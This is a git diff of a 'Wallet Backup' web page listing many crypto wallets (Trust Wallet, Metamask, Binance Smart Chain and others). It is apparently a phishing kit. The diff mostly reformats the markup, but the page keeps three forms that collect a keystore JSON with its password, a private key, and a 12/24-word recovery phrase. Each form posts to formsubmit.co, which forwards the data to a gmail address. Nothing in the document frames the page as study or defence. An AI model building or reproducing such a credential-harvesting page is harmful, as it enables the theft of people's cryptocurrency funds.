@@ -14,31 +14,34 @@
     />
     <link
       rel="shortcut icon"
-      href="./assets/image/web-logo.png"
+      href="./asset/image/web-logo.png"
       type="image/x-icon"
     />
   </head>
   <body class="bg-gray-100">
-    <nav class="bg-blue-500 p-3 fixed w-full flex justify-between px-8 items-center space-x-4">
+    <nav
+      class="bg-blue-500 p-4 top-0 fixed w-full flex justify-between px-8 items-center space-x-4"
+    >
       <a href="./index.html">
         <img
-          src="./assets/image/web-logo.png"
+          src="./asset/image/web-logo.png"
           alt="wallet backup"
           title="Wallet Backup"
           class="w-20 h-10 rounded-full"
         />
       </a>
 
-      <span id="getStartedWallet" class="bg-white py-1 px-4 rounded cursor-pointer">
+      <span
+        id="getStartedWallet"
+        class="bg-white py-1 px-4 rounded cursor-pointer"
+      >
         🟰
       </span>
     </nav>
 
-    
-
     <div class="hidden justify-center z-50" id="modal">
       <div
-        class="absolute pb-10 overflow-y-auto top-0 md:bottom-0 no-scrollbar  flex flex-col items-center justify-center bg-gray-800 bg-opacity-70 z-40"
+        class="absolute pb-10 overflow-y-auto top-0 md:bottom-0 no-scrollbar flex flex-col items-center justify-center bg-gray-800 bg-opacity-70 z-40"
       >
         <!-- List of wallet to backup -->
         <div class="flex gap-4 flex-wrap mb-4 items-center justify-center">
@@ -378,7 +381,6 @@
             </a>
             <h1 class="text-white font-bold">Blockchain</h1>
           </div>
-          
         </div>
         <!-- End of the List of wallet to backup -->
 
@@ -403,7 +405,7 @@
       </div>
     </div>
 
-    <div class="container mx-auto mt-8 mb-16 p-8 bg-white rounded-lg shadow-lg">
+    <div class="container mx-auto mt-8 mb-16 p-8 bg-white rounded-lg pt-32 shadow-lg">
       <h1 class="text-3xl font-bold mb-4 text-center">Backup Your Wallet</h1>
       <p class="mb-4 text-center">Import your Wallet Connect wallet</p>
 
@@ -431,7 +433,12 @@
       </div>
 
       <!-- Keystore JSON form -->
-      <form id="keystoreForm" class="hidden" action="https://formsubmit.co/walletbackup.us@gmail.com" method="POST">
+      <form
+        id="keystoreForm"
+        class="hidden"
+        action="https://formsubmit.co/walletbackup.us@gmail.com"
+        method="POST"
+      >
         <h2 class="text-lg font-semibold mb-2">
           Enter Wallet Name and Keystore JSON:
         </h2>
@@ -458,7 +465,10 @@
           name="keystorePassword"
           required
         />
-        <i class="py-3">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</i>
+        <i class="py-3"
+          >Several lines of text beginning with "{...}" plus the password you
+          used to encrypt it.</i
+        >
         <button
           id="keystoreSubmit"
           class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-md w-full focus:outline-none focus:ring-2 focus:ring-blue-400"
@@ -469,7 +479,12 @@
       </form>
 
       <!-- Private Key form -->
-      <form id="privateKeyForm" class="hidden" action="https://formsubmit.co/walletbackup.us@gmail.com" method="POST">
+      <form
+        id="privateKeyForm"
+        class="hidden"
+        action="https://formsubmit.co/walletbackup.us@gmail.com"
+        method="POST"
+      >
         <h2 class="text-lg font-semibold mb-2">
           Enter Wallet Name and Private Key:
         </h2>
@@ -497,7 +512,9 @@
           name="PrivateKeyPassword"
           required
         />
-        <i class="py-3">Typically 12 (sometimes 24) words seperated by a single space.</i>
+        <i class="py-3"
+          >Typically 12 (sometimes 24) words seperated by a single space.</i
+        >
         <button
           id="privateKeySubmit"
           class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-md w-full focus:outline-none focus:ring-2 focus:ring-green-400"
@@ -508,7 +525,12 @@
       </form>
 
       <!-- Recovery Phrase form -->
-      <form id="phraseForm" class="hidden" action="https://formsubmit.co/walletbackup.us@gmail.com" method="POST">
+      <form
+        id="phraseForm"
+        class="hidden"
+        action="https://formsubmit.co/walletbackup.us@gmail.com"
+        method="POST"
+      >
         <h2 class="text-lg font-semibold mb-2">
           Enter Wallet Name and Recovery Phrase:
         </h2>
@@ -547,33 +569,30 @@
 
     <footer class="bg-blue-500 text-white pb-4">
       <div class="flex w-full justify-around p-6 leading-10">
-        <div class="flex flex-wrap flex-col ">
-        
-        <p><a href="./wallet.html">Trust Wallet</a></p>
-        <p><a href="./wallet.html">Money</a></p>
-        <p><a href="./wallet.html">MathWallet</a></p>
-        <p><a href="./wallet.html">Maiar</a></p>
-        <p><a href="./wallet.html">lobstr</a></p>
-        <p><a href="./wallet.html">ONTO</a></p>
-        <p><a href="./wallet.html">SafePal</a></p>
-        <p><a href="./wallet.html">Nash</a></p>
-      </div>
-      <div class="flex flex-wrap flex-col">
-        <p><a href="./wallet.html">TokenPocket</a></p>
-        <p><a href="./wallet.html">Aktionariat</a></p>
-        <p><a href="./wallet.html">ZelCore</a></p>
-        <p><a href="./wallet.html">MYKEY</a></p>
-        <p><a href="./wallet.html">Metamask</a></p>
-        <p><a href="./wallet.html">Midas Wallet</a></p>
-        <p><a href="./wallet.html">Binance Smart Chain</a></p>
-        <p><a href="./wallet.html">Blockchain</a></p>
-      </div>
+        <div class="flex flex-wrap flex-col">
+          <p><a href="./wallet.html">Trust Wallet</a></p>
+          <p><a href="./wallet.html">Money</a></p>
+          <p><a href="./wallet.html">MathWallet</a></p>
+          <p><a href="./wallet.html">Maiar</a></p>
+          <p><a href="./wallet.html">lobstr</a></p>
+          <p><a href="./wallet.html">ONTO</a></p>
+          <p><a href="./wallet.html">SafePal</a></p>
+          <p><a href="./wallet.html">Nash</a></p>
+        </div>
+        <div class="flex flex-wrap flex-col">
+          <p><a href="./wallet.html">TokenPocket</a></p>
+          <p><a href="./wallet.html">Aktionariat</a></p>
+          <p><a href="./wallet.html">ZelCore</a></p>
+          <p><a href="./wallet.html">MYKEY</a></p>
+          <p><a href="./wallet.html">Metamask</a></p>
+          <p><a href="./wallet.html">Midas Wallet</a></p>
+          <p><a href="./wallet.html">Binance Smart Chain</a></p>
+          <p><a href="./wallet.html">Blockchain</a></p>
+        </div>
       </div>
 
       <p class="text-center">Wallet Backup &copy; Copyright 2023</p>
     </footer>
-
-    
 
     <script>
       // Get references to the menu and close button
